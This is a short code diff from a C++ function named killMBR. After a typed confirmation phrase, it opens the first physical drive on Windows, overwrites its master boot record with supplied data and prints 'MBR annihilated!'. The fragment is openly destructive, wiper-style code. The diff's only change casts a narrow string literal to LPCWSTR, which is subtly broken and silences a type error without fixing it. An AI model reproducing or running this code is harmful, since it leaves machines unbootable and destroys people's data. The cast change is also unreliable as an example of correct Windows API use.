@@ -179,7 +179,7 @@ void ShellAuth::killMBR() {
 			std::cout << "Type \"I am fully responsible for the damage I will cause to this PC (Case-sensitive) > " << std::flush;
 			getline(std::cin, userInput);
 			if (userInput == "I am fully responsible for the damage I will cause to this PC") {
-				HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
+				HANDLE MasterBootRecord = CreateFile((LPCWSTR)"\\\\.\\PhysicalDrive0",
 					GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 				if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
 					std::cout << "\nMBR annihilated!\n" << std::endl;
